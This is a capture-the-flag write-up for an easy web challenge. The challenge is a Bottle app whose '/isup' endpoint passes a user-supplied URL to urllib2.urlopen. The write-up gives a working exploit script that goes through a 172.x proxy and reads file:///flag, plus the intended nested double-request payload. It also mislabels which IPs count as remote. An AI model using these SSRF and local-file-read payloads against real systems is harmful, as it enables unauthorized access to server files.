# double
Web, Easy

## Description

> Get the /flag at http://108.61.211.185/

## Solution

When accessing the site we get the following output:

```python
import string
import urllib2
from bottle import route, run, post, get, request

@get('/')
def index():
    with open(__file__) as f:
        return '<pre>' + "".join({'<':'<','>':'>'}.get(c,c) for c in f.read()) + '</pre>'


@post('/isup')
@get('/isup')
def isup():
    try:
        name = request.params.get('name', None)
        ip = request.environ.get('REMOTE_ADDR')
        is_remote = not (ip.startswith('127') or ip.startswith('172'))

        is_valid = all(x in name for x in ['http', 'kuchenblech'])
        if is_remote and not is_valid:
            raise Exception
        result = urllib2.urlopen(name).read()
        return result
    except:
        return 'Error'

run(host='0.0.0.0', server="paste", port=8080, reloader=False)
```

It looks like the root directory prints the source of the backend script. Using the `/isup` page, we can read a webpage via `urllib2.urlopen(name).read()`, assuming we comply with the preconditions:

* If our IP is identified as a remote IP (i.e. it starts with `127` or `172`), we can only read URLs which contain both `http` and `kuchenblech` (note: The CTF domain was `http://kuchenblech.xyz/`).
* Local IPs can read any URL.

`127.*.*.*` should be familiar to everyone. Let's research `172.*.*.*` addresses:

> If the 1st octet is 172 and the 2nd octet of a IPv4 address is 16–31, you have a private IP address, similar to 192.168.x.x or 10.x.x.x. These are the 3 private IP address ranges that are reserved per RFC 1918.
> 
> ...
> 
> If the 2nd octet of an IPv4 address starting with 172 is anything other than 16–31, it’s a publicly routable IP, just like almost any other.
> ([Source](https://www.quora.com/What-is-the-significance-of-IP-addresses-starting-with-172))

So, using a proxy which starts with `172` we can bypass the `is_valid` check. But what should we send as the `name`? Sending `http://108.61.211.185/flag` didn't work, perhaps `/flag` is a local file?

It turns out `urlopen` can open local files as well, so in order to open `/flag` we need to send `file:///flag`.

The final script is:

```python
import requests

s = requests.Session()
def get_page(ip):
    r = s.get('http://108.61.211.185/isup?name=file:///flag', proxies={'http': ip})
    return r.text

print get_page("http://172.93.199.90:3131")
```

The flag: `junior-double_or_noth1ng`.

According to the flag (and the challenge name), the intended solution was to make a double request:

```
http://108.61.211.185/isup?name=http://108.61.211.185/isup?kuchenblech=1%26name=file:///flag
```

The `name` of the external request contains both `http` and `kuchenblech` while the internal request is performed locally and therefore does not need any validation.